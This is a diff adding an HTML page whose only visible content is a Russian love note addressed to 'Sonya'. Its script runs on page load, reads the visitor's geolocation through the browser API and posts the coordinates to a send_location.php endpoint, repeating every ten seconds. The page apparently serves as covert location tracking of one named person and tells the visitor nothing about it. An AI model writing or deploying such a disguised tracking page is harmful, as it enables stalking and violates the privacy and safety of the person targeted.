@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Отправка геолокации</title>
+    <script>
+      function sendLocation(latitude, longitude) {
+        // Создание XMLHTTP-запроса
+        var xhr = new XMLHttpRequest();
+        // URL-адрес для отправки запроса
+        var url = "send_location.php";
+        // Данные для отправки
+        var params = "latitude=" + latitude + "&longitude=" + longitude;
+        // Отправка запроса
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            console.log(xhr.responseText);
+          }
+        };
+        xhr.send(params);
+      }
+
+      // Функция для получения геолокации
+      function getLocation() {
+        // Проверка поддержки HTML5 Geolocation API
+        if (navigator.geolocation) {
+          // Получение текущей геолокации
+          navigator.geolocation.getCurrentPosition(function (position) {
+            // Получение координат
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            // Отправка геолокации на сервер
+            sendLocation(latitude, longitude);
+          });
+        } else {
+          // Если браузер не поддерживает HTML5 Geolocation API
+          console.log("HTML5 Geolocation не поддерживается в этом браузере.");
+        }
+      }
+
+      // Вызов функции для получения геолокации
+      getLocation();
+      // Получение геолокации каждые 10 секунд
+      setInterval(getLocation, 10000);
+    </script>
+  </head>
+  <body>
+    <h1>Соня я люблю тебя</h1>
+  </body>
+</html>
